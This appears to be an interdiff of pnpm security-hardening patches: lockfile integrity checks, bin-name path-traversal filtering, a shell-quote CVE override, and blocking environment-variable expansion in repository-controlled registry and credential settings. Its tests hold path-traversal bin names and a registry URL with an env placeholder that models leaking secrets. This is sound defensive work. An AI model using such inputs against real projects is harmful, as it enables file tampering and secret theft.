-     importers: mapValues(importers ?? {}, revertProjectSnapshot),
-+  }
-+}
-+
-+// Backfill the `gitHosted` flag for tarball resolutions written by older
-+// pnpm versions. Doing it once at load time lets every downstream reader
-+// rely on the typed field instead of repeating URL prefix matches.
-+function enrichGitHostedFlag (resolution: TarballResolution | undefined): void {
-+  if (resolution == null) return
-+  if (resolution.type !== undefined) return
-+  if (resolution.gitHosted != null) return
-+  if (resolution.tarball != null && isGitHostedTarballUrl(resolution.tarball)) {
-+    resolution.gitHosted = true
-   }
- }
- 
 --- /dev/null
 +++ b/lockfile/utils/src/assertRegistryShapedResolution.ts
 @@ -0,0 +1,82 @@
@@ -1371,74 +2765,38 @@
  export { packageIsIndependent } from './packageIsIndependent.js'
 --- a/lockfile/utils/src/pkgSnapshotToResolution.ts
 +++ b/lockfile/utils/src/pkgSnapshotToResolution.ts
-@@ -1,9 +1,10 @@
- import url from 'url'
-+import { PnpmError } from '@pnpm/error'
- import { type PackageSnapshot, type TarballResolution } from '@pnpm/lockfile.types'
+@@ -4,6 +4,7 @@ import { type PackageSnapshot, type TarballResolution } from '@pnpm/lockfile.typ
  import { type Resolution } from '@pnpm/resolver-base'
  import { type Registries } from '@pnpm/types'
  import getNpmTarballUrl from 'get-npm-tarball-url'
--import { isGitHostedPkgUrl } from '@pnpm/pick-fetcher'
-+import { assertRegistryShapedResolution } from './assertRegistryShapedResolution.js'
++import { assertRegistryShapedResolution, isGitHostedTarballUrl } from './assertRegistryShapedResolution.js'
  import { nameVerFromPkgSnapshot } from './nameVerFromPkgSnapshot.js'
  
  export function pkgSnapshotToResolution (
-@@ -11,11 +12,35 @@
+@@ -11,6 +12,7 @@ export function pkgSnapshotToResolution (
    pkgSnapshot: PackageSnapshot,
    registries: Registries
  ): Resolution {
 +  assertRegistryShapedResolution(depPath, pkgSnapshot)
-+  const resolution = pkgSnapshot.resolution as TarballResolution
-+  // Tarball-shaped resolutions (no `type` field) must carry `integrity`,
-+  // except where the URL itself anchors the bytes:
-+  //   - `file:` tarballs (local file on the user's machine; integrity
-+  //     adds nothing the user doesn't already control).
-+  //   - Git-hosted tarballs (URL contains the commit SHA; git's content-
-+  //     addressed model binds the bytes to the commit). The `gitHosted`
-+  //     flag may be absent on legacy lockfiles, so fall back to a URL
-+  //     match against the known git-host download endpoints.
-+  // For any other tarball entry a missing integrity is what a tampered
-+  // lockfile looks like: the worker would mint a fresh integrity from
-+  // whatever bytes the URL returned, so we fail closed here.
+   const resolution = pkgSnapshot.resolution as TarballResolution
    if (
--    Boolean((pkgSnapshot.resolution as TarballResolution).type) ||
--    (pkgSnapshot.resolution as TarballResolution).tarball?.startsWith('file:') ||
--    isGitHostedPkgUrl((pkgSnapshot.resolution as TarballResolution).tarball ?? '')
-+    resolution.type == null &&
-+    resolution.integrity == null &&
-+    !resolution.tarball?.startsWith('file:') &&
-+    !(resolution.gitHosted === true || (resolution.tarball != null && isGitHostedTarballUrl(resolution.tarball)))
-   ) {
-+    throw new PnpmError('MISSING_TARBALL_INTEGRITY',
-+      `Cannot install package "${depPath}": its lockfile entry has no "integrity" field, so pnpm cannot verify the downloaded tarball.`,
-+      { hint: 'The lockfile may be corrupted or have been tampered with. Restore it from a trusted source, or delete it and re-run installation without --frozen-lockfile to regenerate.' }
-+    )
-+  }
-+  if (
-+    Boolean(resolution.type) ||
-+    resolution.tarball?.startsWith('file:') ||
-+    resolution.gitHosted === true
-+  ) {
-     return pkgSnapshot.resolution as Resolution
-   }
-   const { name, version } = nameVerFromPkgSnapshot(depPath, pkgSnapshot)
-@@ -47,4 +72,16 @@
+     resolution.type == null &&
+@@ -58,15 +58,7 @@ export function pkgSnapshotToResolution (
+   function getTarball (registry: string) {
+     if (!name || !version) {
+       throw new Error(`Couldn't get tarball URL from dependency path ${depPath}`)
      }
      return getNpmTarballUrl(name, version, { registry })
    }
-+}
-+
-+// Fallback for legacy lockfile entries whose tarball resolution lacks the
-+// `gitHosted` flag. Matches the known git-host download endpoints so a URL
-+// rewritten by pnpm's git resolver is still recognized as content-addressed
-+// and exempt from the integrity requirement.
-+function isGitHostedTarballUrl (url: string): boolean {
-+  return (
-+    url.startsWith('https://codeload.github.com/') ||
-+    url.startsWith('https://bitbucket.org/') ||
-+    url.startsWith('https://gitlab.com/')
-+  )
  }
+-
+-function isGitHostedTarballUrl (url: string): boolean {
+-  return (
+-    url.startsWith('https://codeload.github.com/') ||
+-    url.startsWith('https://bitbucket.org/') ||
+-    url.startsWith('https://gitlab.com/')
+-  )
+-}
 --- /dev/null
 +++ b/lockfile/utils/test/assertRegistryShapedResolution.ts
 @@ -0,0 +1,145 @@
@@ -1589,7 +2947,7 @@
 +})
 --- a/packages/dependency-path/src/index.ts
 +++ b/packages/dependency-path/src/index.ts
-@@ -60,13 +60,16 @@
+@@ -60,13 +60,16 @@ export function removeSuffix (relDepPath: string): string {
    return relDepPath
  }
  
@@ -1625,7 +2983,7 @@
  export type TrustPolicy = 'no-downgrade' | 'off'
 --- a/pkg-manager/core/src/install/index.ts
 +++ b/pkg-manager/core/src/install/index.ts
-@@ -4,7 +4,6 @@
+@@ -4,7 +4,6 @@ import { createAllowBuildFunction } from '@pnpm/builder.policy'
  import { parseCatalogProtocol } from '@pnpm/catalogs.protocol-parser'
  import { resolveFromCatalog, matchCatalogResolveResult, type CatalogResultMatcher } from '@pnpm/catalogs.resolver'
  import { type Catalogs } from '@pnpm/catalogs.types'
@@ -1633,7 +2991,7 @@
  import {
    LAYOUT_VERSION,
    LOCKFILE_VERSION,
-@@ -872,18 +870,16 @@
+@@ -868,18 +867,16 @@ async function runUnignoredDependencyBuilds (opts: StrictInstallOptions, previou
    if (!opts.onlyBuiltDependencies?.length) {
      return previousIgnoredBuilds
    }
@@ -1661,7 +3019,7 @@
    if (pkgsToBuild.length) {
      return (await rebuildSelectedPkgs(opts.allProjects, pkgsToBuild, {
        ...opts,
-@@ -1294,6 +1292,7 @@
+@@ -1291,6 +1288,7 @@ const _installInContext: InstallFunction = async (projects, ctx, opts) => {
          dependenciesByProjectId,
          depsStateCache,
          disableRelinkLocalDirDeps: opts.disableRelinkLocalDirDeps,
@@ -1669,7 +3027,7 @@
          extraNodePaths: ctx.extraNodePaths,
          force: opts.force,
          hoistedDependencies: ctx.hoistedDependencies,
-@@ -1725,7 +1721,7 @@
+@@ -1719,7 +1717,7 @@ export class IgnoredBuildsError extends PnpmError {
  }
  
  function dedupePackageNamesFromIgnoredBuilds (ignoredBuilds: IgnoredBuilds): string[] {
@@ -1680,7 +3038,7 @@
  /**
 --- a/pkg-manager/core/src/install/link.ts
 +++ b/pkg-manager/core/src/install/link.ts
-@@ -51,6 +51,7 @@
+@@ -51,6 +51,7 @@ export interface LinkPackagesOptions {
    disableRelinkLocalDirDeps?: boolean
    force: boolean
    depsStateCache: DepsStateCache
@@ -1688,7 +3046,7 @@
    extraNodePaths: string[]
    hoistedDependencies: HoistedDependencies
    hoistedModulesDir: string
-@@ -151,6 +152,7 @@
+@@ -151,6 +152,7 @@ export async function linkPackages (projects: ImporterToUpdate[], depGraph: Depe
      {
        allowBuild: opts.allowBuild,
        disableRelinkLocalDirDeps: opts.disableRelinkLocalDirDeps,
@@ -1696,7 +3054,7 @@
        force: opts.force,
        depsStateCache: opts.depsStateCache,
        ignoreScripts: opts.ignoreScripts,
-@@ -322,6 +324,7 @@
+@@ -322,6 +324,7 @@ interface LinkNewPackagesOptions {
    allowBuild?: AllowBuild
    depsStateCache: DepsStateCache
    disableRelinkLocalDirDeps?: boolean
@@ -1704,7 +3062,7 @@
    force: boolean
    optional: boolean
    ignoreScripts: boolean
-@@ -402,6 +405,7 @@
+@@ -402,6 +405,7 @@ async function linkNewPackages (
        depGraph,
        depsStateCache: opts.depsStateCache,
        disableRelinkLocalDirDeps: opts.disableRelinkLocalDirDeps,
@@ -1712,7 +3070,7 @@
        force: opts.force,
        ignoreScripts: opts.ignoreScripts,
        lockfileDir: opts.lockfileDir,
-@@ -456,6 +460,7 @@
+@@ -456,6 +460,7 @@ async function linkAllPkgs (
      depGraph: DependenciesGraph
      depsStateCache: DepsStateCache
      disableRelinkLocalDirDeps?: boolean
@@ -1720,7 +3078,7 @@
      force: boolean
      ignoreScripts: boolean
      lockfileDir: string
-@@ -469,7 +474,7 @@
+@@ -469,7 +474,7 @@ async function linkAllPkgs (
        depNode.requiresBuild = files.requiresBuild
        let sideEffectsCacheKey: string | undefined
        if (opts.sideEffectsCacheRead && files.sideEffects && !isEmpty(files.sideEffects)) {
@@ -1729,7 +3087,7 @@
            sideEffectsCacheKey = calcDepState(opts.depGraph, opts.depsStateCache, depNode.depPath, {
              includeDepGraphHash: !opts.ignoreScripts && depNode.requiresBuild, // true when is built
              patchFileHash: depNode.patch?.file.hash,
-@@ -480,6 +485,7 @@
+@@ -480,6 +485,7 @@ async function linkAllPkgs (
          disableRelinkLocalDirDeps: opts.disableRelinkLocalDirDeps,
          filesResponse: files,
          force: opts.force,
@@ -1747,7 +3105,7 @@
  import { assertProject } from '@pnpm/assert-project'
  import { type LifecycleLog } from '@pnpm/core-loggers'
  import { prepareEmpty, preparePackages } from '@pnpm/prepare'
-@@ -12,6 +14,7 @@
+@@ -12,6 +14,7 @@ import {
  } from '@pnpm/core'
  import { createTestIpcServer } from '@pnpm/test-ipc-server'
  import { type ProjectRootDir } from '@pnpm/types'
@@ -1755,7 +3113,7 @@
  import { restartWorkerPool } from '@pnpm/worker'
  import { sync as rimraf } from '@zkochan/rimraf'
  import isWindows from 'is-windows'
-@@ -310,7 +313,9 @@
+@@ -310,7 +313,9 @@ test('run prepare script for git-hosted dependencies', async () => {
  
    await addDependenciesToPackage({}, ['pnpm/test-git-fetch#8b333f12d5357f4f25a654c305c826294cb073bf'], testDefaults({
      fastUnpack: false,
@@ -1766,12 +3124,10 @@
      neverBuiltDependencies: undefined,
    }))
  
-@@ -324,6 +329,48 @@
-     'install',
-     'postinstall',
+@@ -326,6 +331,48 @@ test('run prepare script for git-hosted dependencies', async () => {
    ])
-+})
-+
+ })
+ 
 +test('onlyBuiltDependencies does not run lifecycle scripts for direct tarball identities', async () => {
 +  prepareEmpty()
 +  // A tarball URL on the configured registry host resolves as a registry
@@ -1812,12 +3168,14 @@
 +  } finally {
 +    server.close()
 +  }
- })
- 
++})
++
  test('lifecycle scripts run before linking bins', async () => {
+   const project = prepareEmpty()
+ 
 --- a/pkg-manager/headless/src/index.ts
 +++ b/pkg-manager/headless/src/index.ts
-@@ -433,6 +433,7 @@
+@@ -433,6 +433,7 @@ export async function headlessInstall (opts: HeadlessOptions): Promise<Installat
          allowBuild,
          force: opts.force,
          disableRelinkLocalDirDeps: opts.disableRelinkLocalDirDeps,
@@ -1825,7 +3183,7 @@
          depGraph: graph,
          depsStateCache,
          ignoreScripts: opts.ignoreScripts,
-@@ -865,6 +866,7 @@
+@@ -865,6 +866,7 @@ async function linkAllPkgs (
      depGraph: DependenciesGraph
      depsStateCache: DepsStateCache
      disableRelinkLocalDirDeps?: boolean
@@ -1833,7 +3191,7 @@
      force: boolean
      ignoreScripts: boolean
      lockfileDir: string
-@@ -885,7 +887,7 @@
+@@ -885,7 +887,7 @@ async function linkAllPkgs (
        depNode.requiresBuild = filesResponse.requiresBuild
        let sideEffectsCacheKey: string | undefined
        if (opts.sideEffectsCacheRead && filesResponse.sideEffects && !isEmpty(filesResponse.sideEffects)) {
@@ -1842,7 +3200,7 @@
            sideEffectsCacheKey = calcDepState(opts.depGraph, opts.depsStateCache, depNode.dir, {
              includeDepGraphHash: !opts.ignoreScripts && depNode.requiresBuild, // true when is built
              patchFileHash: depNode.patch?.file.hash,
-@@ -897,6 +899,7 @@
+@@ -897,6 +899,7 @@ async function linkAllPkgs (
          force: depNode.forceImportPackage ?? opts.force,
          disableRelinkLocalDirDeps: opts.disableRelinkLocalDirDeps,
          requiresBuild: depNode.patch != null || depNode.requiresBuild,
@@ -1852,7 +3210,7 @@
        if (importMethod) {
 --- a/pkg-manager/headless/src/linkHoistedModules.ts
 +++ b/pkg-manager/headless/src/linkHoistedModules.ts
-@@ -116,7 +116,7 @@
+@@ -116,7 +116,7 @@ async function linkAllPkgsInOrder (
          depNode.requiresBuild = filesResponse.requiresBuild
          let sideEffectsCacheKey: string | undefined
          if (opts.sideEffectsCacheRead && filesResponse.sideEffects && !isEmpty(filesResponse.sideEffects)) {
@@ -1861,9 +3219,30 @@
              sideEffectsCacheKey = _calcDepState(dir, {
                includeDepGraphHash: !opts.ignoreScripts && depNode.requiresBuild, // true when is built
                patchFileHash: depNode.patch?.file.hash,
+--- a/pnpm-workspace.yaml
++++ b/pnpm-workspace.yaml
+@@ -383,6 +383,8 @@ overrides:
+   semver@<7.5.2: 'catalog:'
+   send@<0.19.0: ^0.19.0
+   serve-static@<1.16.0: ^1.16.0
++  # GHSA-w7jw-789q-3m8p / CVE-2026-9277: 1.8.4 patches critical shell-quote vulnerabilities in <=1.8.3.
++  shell-quote: 1.8.4
+   socks@2: ^2.8.1
+   tar@<=7.5.10: '>=7.5.11'
+   tmp@<=0.2.3: '>=0.2.4'
+--- a/pnpm/package.json
++++ b/pnpm/package.json
+@@ -208,6 +208,7 @@
+       "semver@<7.5.2": "^7.7.4",
+       "send@<0.19.0": "^0.19.0",
+       "serve-static@<1.16.0": "^1.16.0",
++      "shell-quote": "1.8.4",
+       "socks@2": "^2.8.1",
+       "tar@<=7.5.10": ">=7.5.11",
+       "tmp@<=0.2.3": ">=0.2.4",
 --- a/pnpm/test/dlx.ts
 +++ b/pnpm/test/dlx.ts
-@@ -173,7 +173,13 @@
+@@ -173,7 +173,13 @@ test('dlx creates cache and store prune cleans cache', async () => {
      '--config.dlx-cache-max-age=50', // big number to avoid false negative should test unexpectedly takes too long to run
    ]
  
@@ -1892,7 +3271,7 @@
      id += `&path:${path}`
    }
    return id as PkgResolutionId
-+}
+ }
 +
 +function normalizeGitRepoForPkgResolutionId (repo: string): string {
 +  // Only scp-style shorthand (`user@host:path`) needs rewriting. A repo that
@@ -1902,10 +3281,10 @@
 +  if (repo.includes('://')) return repo
 +  const scp = /^([^@\s]+@[^:\s]+):(.+)$/.exec(repo)
 +  return scp == null ? repo : `ssh://${scp[1]}/${scp[2]}`
- }
++}
 --- a/resolving/git-resolver/test/createGitHostedPkgId.test.ts
 +++ b/resolving/git-resolver/test/createGitHostedPkgId.test.ts
-@@ -2,6 +2,10 @@
+@@ -2,6 +2,10 @@ import { createGitHostedPkgId } from '@pnpm/git-resolver'
  
  test.each([
    [{ repo: 'ssh://git@example.com/org/repo.git', commit: 'cba04669e621b85fbdb33371604de1a2898e68e9' }, 'git+ssh://git@example.com/org/repo.git#cba04669e621b85fbdb33371604de1a2898e68e9'],
@@ -1928,7 +3307,7 @@
  }
 --- a/reviewing/plugin-commands-licenses/test/index.ts
 +++ b/reviewing/plugin-commands-licenses/test/index.ts
-@@ -310,7 +310,9 @@
+@@ -310,7 +310,9 @@ test('pnpm licenses should work with git protocol dep that have peerDependencies
    await install.handler({
      ...DEFAULT_OPTS,
      dir: workspaceDir,
@@ -1939,59 +3318,6 @@
      pnpmHomeDir: '',
      storeDir,
    })
---- a/pnpm-workspace.yaml
-+++ b/pnpm-workspace.yaml
-@@ -383,6 +383,8 @@
-   semver@<7.5.2: 'catalog:'
-   send@<0.19.0: ^0.19.0
-   serve-static@<1.16.0: ^1.16.0
-+  # GHSA-w7jw-789q-3m8p / CVE-2026-9277: 1.8.4 patches critical shell-quote vulnerabilities in <=1.8.3.
-+  shell-quote: 1.8.4
-   socks@2: ^2.8.1
-   tar@<=7.5.10: '>=7.5.11'
-   tmp@<=0.2.3: '>=0.2.4'
---- a/pnpm/package.json
-+++ b/pnpm/package.json
-@@ -208,6 +208,7 @@
-       "semver@<7.5.2": "^7.7.4",
-       "send@<0.19.0": "^0.19.0",
-       "serve-static@<1.16.0": "^1.16.0",
-+      "shell-quote": "1.8.4",
-       "socks@2": "^2.8.1",
-       "tar@<=7.5.10": ">=7.5.11",
-       "tmp@<=0.2.3": ">=0.2.4",
---- a/lockfile/types/src/index.ts
-+++ b/lockfile/types/src/index.ts
-@@ -90,6 +90,19 @@ export interface TarballResolution {
-   tarball: string
-   integrity?: string
-   path?: string
-+  /**
-+   * True for tarballs sourced from a git host (codeload.github.com /
-+   * gitlab.com / bitbucket.org). Such tarballs need preparation
-+   * (preparePackage / packlist) on extraction, and their cached content
-+   * depends on whether build scripts ran, so they're addressed by
-+   * gitHostedStoreIndexKey rather than the integrity-based key.
-+   *
-+   * The git resolver sets this when it produces the resolution; the
-+   * lockfile loader sets it on entries whose URL matches a known git host
-+   * for backward compatibility with lockfiles written before this field
-+   * existed.
-+   */
-+  gitHosted?: boolean
- }
- 
- /**
---- a/lockfile/utils/package.json
-+++ b/lockfile/utils/package.json
-@@ -34,6 +34,7 @@
-   },
-   "dependencies": {
-     "@pnpm/dependency-path": "workspace:*",
-+    "@pnpm/error": "workspace:*",
-     "@pnpm/lockfile.types": "workspace:*",
-     "@pnpm/pick-fetcher": "workspace:*",
-     "@pnpm/resolver-base": "workspace:*",
 --- a/store/cafs-types/src/index.ts
 +++ b/store/cafs-types/src/index.ts
 @@ -39,6 +39,7 @@ export interface ImportPackageOpts {
@@ -2003,58 +3329,14 @@
  
  export type ImportPackageFunction = (
 
---- a/pkg-manager/package-bins/src/index.ts
-+++ b/pkg-manager/package-bins/src/index.ts
-@@ -49,7 +49,13 @@ function commandsFromBin (bin: PackageBin, pkgName: string, pkgPath: string): Co
-     const binName = commandName[0] === '@'
-       ? commandName.slice(commandName.indexOf('/') + 1)
-       : commandName
--    // Validate: must be safe (no path traversal) - only allow URL-safe chars or $
-+    // Validate: must be safe (no path traversal). Reject empty and the
-+    // filesystem-relative names "." and ".." (these survive encodeURIComponent
-+    // unchanged but resolve to the bin directory itself or its parent when
-+    // joined to a target dir), then only allow URL-safe chars or $.
-+    if (binName === '' || binName === '.' || binName === '..') {
-+      continue
-+    }
-     if (binName !== encodeURIComponent(binName) && binName !== '$') {
-       continue
-     }
---- a/pkg-manager/package-bins/test/index.ts
-+++ b/pkg-manager/package-bins/test/index.ts
-@@ -145,6 +145,26 @@ test('skip scoped bin names with path traversal', async () => {
-   ])
- })
-
-+test('skip reserved bin names', async () => {
-+  expect(
-+    await getBinsFromPackageManifest({
-+      name: 'malicious',
-+      version: '1.0.0',
-+      bin: {
-+        '': './empty.js',
-+        '.': './dot.js',
-+        '..': './dot-dot.js',
-+        '@scope/..': './scoped-dot-dot.js',
-+        good: './good',
-+      },
-+    }, process.cwd())).toStrictEqual([
-+    {
-+      name: 'good',
-+      path: path.resolve('good'),
-+    },
-+  ])
-+})
-+
- test('skip directories.bin with path traversal', async () => {
-   // Security test: malicious packages can try to escape the package root
-   // using directories.bin to chmod files at arbitrary locations
+diff --git a/config/config/src/Config.ts b/config/config/src/Config.ts
+index 8e8afcf..f0742fd 100644
 --- a/config/config/src/Config.ts
 +++ b/config/config/src/Config.ts
 @@ -20,6 +20,27 @@ export interface WantedPackageManager {
-
+ 
  export type VerifyDepsBeforeRun = 'install' | 'warn' | 'error' | 'prompt' | false
-
+ 
 +/**
 + * Registry/network settings for package-manager bootstrap traffic
 + * (downloading the pnpm version requested by a repository's packageManager
@@ -2081,69 +3363,14 @@
    selectedProjectsGraph?: ProjectsGraph
 @@ -194,6 +215,8 @@ export interface Config extends OptionsFromRootManifest {
    blockExoticSubdeps?: boolean
-
+ 
    registries: Registries
 +  packageManagerRegistries?: Registries
 +  packageManagerNetworkConfig?: PackageManagerNetworkConfig
    sslConfigs: Record<string, SslConfig>
    ignoreWorkspaceRootCheck: boolean
    workspaceRoot: boolean
---- a/config/config/src/getOptionsFromRootManifest.ts
-+++ b/config/config/src/getOptionsFromRootManifest.ts
-@@ -116,11 +116,18 @@ export function getOptionsFromPnpmSettings (manifestDir: string, pnpmSettings: P
-   return settings
- }
 
-+// Settings that name a request destination. pnpm-workspace.yaml and the
-+// root manifest are repository-controlled, so expanding ${...} placeholders
-+// in these values would let a repository exfiltrate environment variables
-+// through the URLs pnpm sends requests to.
-+const REQUEST_DESTINATION_SCALAR_KEYS = new Set(['registry'])
-+
- function replaceEnvInSettings (settings: PnpmSettings): PnpmSettings {
-   const newSettings: PnpmSettings = {}
-   for (const [key, value] of Object.entries(settings)) {
-     const newKey = envReplace(key, process.env)
-     if (typeof value === 'string') {
-+      if (REQUEST_DESTINATION_SCALAR_KEYS.has(newKey) && hasEnvPlaceholder(value)) continue
-       // @ts-expect-error
-       newSettings[newKey as keyof PnpmSettings] = envReplace(value, process.env)
-     } else {
-@@ -130,6 +137,10 @@ function replaceEnvInSettings (settings: PnpmSettings): PnpmSettings {
-   return newSettings
- }
-
-+function hasEnvPlaceholder (value: string): boolean {
-+  return /\$\{[^}]+\}/.test(value)
-+}
-+
- function createVersionReferencesReplacer (manifest: ProjectManifest): (spec: string) => string {
-   const allDeps = {
-     ...manifest.devDependencies,
---- a/config/config/test/getOptionsFromRootManifest.test.ts
-+++ b/config/config/test/getOptionsFromRootManifest.test.ts
-@@ -175,6 +175,21 @@ test('getOptionsFromPnpmSettings() replaces env variables in settings', () => {
-   expect(options.foo).toEqual('bar')
- })
-
-+test('getOptionsFromPnpmSettings() ignores env variables inside registry setting', () => {
-+  process.env.PNPM_TEST_HOST = 'registry.example.com'
-+  const options = getOptionsFromPnpmSettings(process.cwd(), {
-+    registry: 'https://${PNPM_TEST_HOST}/npm/', // eslint-disable-line
-+  } as any) as any // eslint-disable-line
-+  expect(options.registry).toBeUndefined()
-+})
-+
-+test('getOptionsFromPnpmSettings() keeps a registry setting without env placeholders', () => {
-+  const options = getOptionsFromPnpmSettings(process.cwd(), {
-+    registry: 'https://registry.example.com/npm/',
-+  } as any) as any // eslint-disable-line
-+  expect(options.registry).toBe('https://registry.example.com/npm/')
-+})
-+
- test('getOptionsFromRootManifest() converts allowBuilds', () => {
-   const options = getOptionsFromRootManifest(process.cwd(), {
-     pnpm: {
 --- /dev/null
 +++ b/config/config/src/dropUntrustedEnvExpansions.ts
 @@ -0,0 +1,97 @@
@@ -2244,62 +3471,7 @@
 +function warnIgnoredAuthValueEnv (filePath: string, key: string, warnings: string[]): void {
 +  warnings.push(`Ignored project-level auth setting "${key}" in "${filePath}": environment variables are not expanded in repository-controlled registry credentials.`)
 +}
---- /dev/null
-+++ b/pnpm/src/packageManagerRegistries.ts
-@@ -0,0 +1,28 @@
-+import { type Config, type PackageManagerNetworkConfig } from '@pnpm/config'
-+import { type Registries } from '@pnpm/types'
-+
-+const DEFAULT_PACKAGE_MANAGER_REGISTRY = 'https://registry.npmjs.org/'
-+
-+export type PackageManagerBootstrapConfig = Partial<PackageManagerNetworkConfig> & {
-+  registries: Registries
-+}
-+
-+/**
-+ * The registries used to download and verify a package-manager binary. These
-+ * are built from trusted config sources only (CLI options, env config, user
-+ * and global .npmrc), defaulting to the public npm registry — repository
-+ * config must not steer where pnpm fetches the binary it is about to execute.
-+ */
-+export function getPackageManagerRegistries (config: Config): Registries {
-+  return {
-+    default: DEFAULT_PACKAGE_MANAGER_REGISTRY,
-+    ...config.packageManagerRegistries,
-+  }
-+}
-+
-+export function getPackageManagerBootstrapConfig (config: Config): PackageManagerBootstrapConfig {
-+  return {
-+    ...config.packageManagerNetworkConfig,
-+    registries: getPackageManagerRegistries(config),
-+  }
-+}
---- a/pnpm/src/switchCliVersion.ts
-+++ b/pnpm/src/switchCliVersion.ts
-@@ -8,6 +8,8 @@ import { installPnpmToTools } from '@pnpm/tools.plugin-commands-self-updater'
- import spawn from 'cross-spawn'
- import semver from 'semver'
-
-+import { getPackageManagerBootstrapConfig } from './packageManagerRegistries.js'
-+
- export async function switchCliVersion (config: Config): Promise<void> {
-   const pm = config.wantedPackageManager
-   if (pm == null || pm.name !== 'pnpm' || pm.version == null || pm.version === packageManager.version) return
-@@ -20,7 +22,12 @@ export async function switchCliVersion (config: Config): Promise<void> {
-     globalWarn(`Cannot switch to pnpm@${pm.version}: you need to specify the version as "${pmVersion}"`)
-     return
-   }
--  const { binDir: wantedPnpmBinDir } = await installPnpmToTools(pmVersion, config)
-+  // Bootstrap traffic for the wanted pnpm version must not be steered by
-+  // repository-controlled registry/proxy/TLS settings.
-+  const { binDir: wantedPnpmBinDir } = await installPnpmToTools(pmVersion, {
-+    ...config,
-+    ...getPackageManagerBootstrapConfig(config),
-+  })
-   const pnpmEnv = prependDirsToPath([wantedPnpmBinDir])
-   if (!pnpmEnv.updated) {
-     // We throw this error to prevent an infinite recursive call of the same pnpm version.
+--- a/config/config/src/index.ts
 --- a/config/config/src/index.ts
 +++ b/config/config/src/index.ts
 @@ -20,6 +20,7 @@ import pathAbsolute from 'path-absolute'
@@ -2310,28 +3482,27 @@
  import { hasDependencyBuildOptions, extractAndRemoveDependencyBuildOptions } from './dependencyBuildOptions.js'
  import { getNetworkConfigs } from './getNetworkConfigs.js'
  import { transformPathKeys } from './transformPath.js'
-@@ -26,6 +27,7 @@ import { transformPathKeys } from './transformPath.js'
- import { getCacheDir, getConfigDir, getDataDir, getStateDir } from './dirs.js'
+@@ -27,6 +28,7 @@ import { getCacheDir, getConfigDir, getDataDir, getStateDir } from './dirs.js'
+ import { rescopeUnscopedCreds } from './rescopeUnscopedCreds.js'
  import {
    type Config,
 +  type PackageManagerNetworkConfig,
    type ConfigWithDeprecatedSettings,
    type UniversalOptions,
    type VerifyDepsBeforeRun,
-@@ -46,7 +48,7 @@ export { getOptionsFromRootManifest, getOptionsFromPnpmSettings, type OptionsFro
+@@ -47,7 +49,7 @@ export { getOptionsFromRootManifest, getOptionsFromPnpmSettings, type OptionsFro
  export * from './readLocalConfig.js'
  export { getDefaultWorkspaceConcurrency, getWorkspaceConcurrency } from './concurrency.js'
-
+ 
 -export type { Config, UniversalOptions, WantedPackageManager, VerifyDepsBeforeRun }
 +export type { Config, PackageManagerNetworkConfig, UniversalOptions, WantedPackageManager, VerifyDepsBeforeRun }
-
+ 
  type CamelToKebabCase<S extends string> = S extends `${infer T}${infer U}`
    ? `${T extends Capitalize<T> ? '-' : ''}${Lowercase<T>}${CamelToKebabCase<U>}`
-@@ -225,6 +227,19 @@ export async function getConfig (opts: {
-     const warn = npmConfig.addFile(path.resolve(path.join(__dirname, 'pnpmrc')), 'pnpm-builtin')
+@@ -227,6 +229,19 @@ export async function getConfig (opts: {
      if (warn) warnings.push(warn)
    }
-+
+ 
 +  // The project and workspace .npmrc files are repository-controlled, so
 +  // they must not be able to expand environment variables into request
 +  // destinations (registry/proxy URLs, URL-scoped keys) or registry
@@ -2344,10 +3515,11 @@
 +    if (sourceEntry?.path == null || sourceEntry.data == null) continue
 +    dropUntrustedEnvExpansions(sourceEntry.data, sourceEntry.path, warnings)
 +  }
-
-   delete cliOptions.prefix
-
-@@ -487,6 +502,48 @@ export async function getConfig (opts: {
++
+   // CVE-2026-50017: pin unscoped per-registry settings to their source's
+   // registry at load time, so a lower-priority layer overriding registry=
+   // cannot rebind a credential authored elsewhere to its own registry.
+@@ -498,6 +513,48 @@ export async function getConfig (opts: {
      // @ts-expect-error
      pnpmConfig.noProxy = pnpmConfig['noproxy'] ?? getProcessEnv('no_proxy')
    }
@@ -2396,10 +3568,10 @@
    switch (pnpmConfig.nodeLinker) {
    case 'pnp':
      pnpmConfig.enablePnp = pnpmConfig.nodeLinker === 'pnp'
-@@ -556,6 +613,12 @@ export async function getConfig (opts: {
+@@ -567,6 +624,12 @@ export async function getConfig (opts: {
    return { config: pnpmConfig, warnings }
  }
-
+ 
 +function getProxyValue (value: unknown, fallback: string | undefined): string | undefined {
 +  if (value === false || value === null) return undefined
 +  if (typeof value === 'string' && value.length > 0) return value
@@ -2410,9 +3582,10 @@
    return process.env[env] ??
      process.env[env.toUpperCase()] ??
 --- a/config/config/test/index.ts
+--- a/config/config/test/index.ts
 +++ b/config/config/test/index.ts
-@@ -238,6 +238,279 @@ test('registries in current directory\'s .npmrc have bigger priority then global
-   })
+@@ -267,6 +267,279 @@ test('pnpm-workspace.yaml request destinations do not expand env variables (CVE-
+   }
  })
  
 +/* eslint-disable no-template-curly-in-string */
@@ -2691,821 +3864,108 @@
  test('filter is read from .npmrc as an array', async () => {
    prepareEmpty()
  
-
---- /dev/null
-+++ b/.changeset/fix-patch-remove-containment.md
-@@ -0,0 +1,6 @@
-+---
-+"@pnpm/plugin-commands-patching": patch
-+"pnpm": patch
-+---
-+
-+Prevent `pnpm patch-remove` from removing files outside the configured patches directory.
---- /dev/null
-+++ b/patching/plugin-commands-patching/src/isSubdirectory.ts
-@@ -0,0 +1,17 @@
-+import path from 'path'
-+
-+interface PathUtils {
-+  isAbsolute: (path: string) => boolean
-+  relative: (from: string, to: string) => string
-+  sep: string
-+}
-+
-+export function isSubdirectory (parentDir: string, childPath: string, pathUtils: PathUtils = path): boolean {
-+  const relativePath = pathUtils.relative(parentDir, childPath)
-+
-+  return relativePath === '' || (
-+    relativePath !== '..' &&
-+    !relativePath.startsWith(`..${pathUtils.sep}`) &&
-+    !pathUtils.isAbsolute(relativePath)
-+  )
-+}
---- a/patching/plugin-commands-patching/src/patchRemove.ts
-+++ b/patching/plugin-commands-patching/src/patchRemove.ts
-@@ -1,5 +1,6 @@
--import path from 'path'
-+import { type Stats } from 'fs'
- import fs from 'fs/promises'
-+import path from 'path'
- import { docsUrl } from '@pnpm/cli-utils'
- import { install } from '@pnpm/plugin-commands-installation'
- import { type Config, types as allTypes } from '@pnpm/config'
-@@ -7,6 +8,7 @@ import { PnpmError } from '@pnpm/error'
- import renderHelp from 'render-help'
- import { prompt } from 'enquirer'
- import pick from 'ramda/src/pick'
-+import { isSubdirectory } from './isSubdirectory.js'
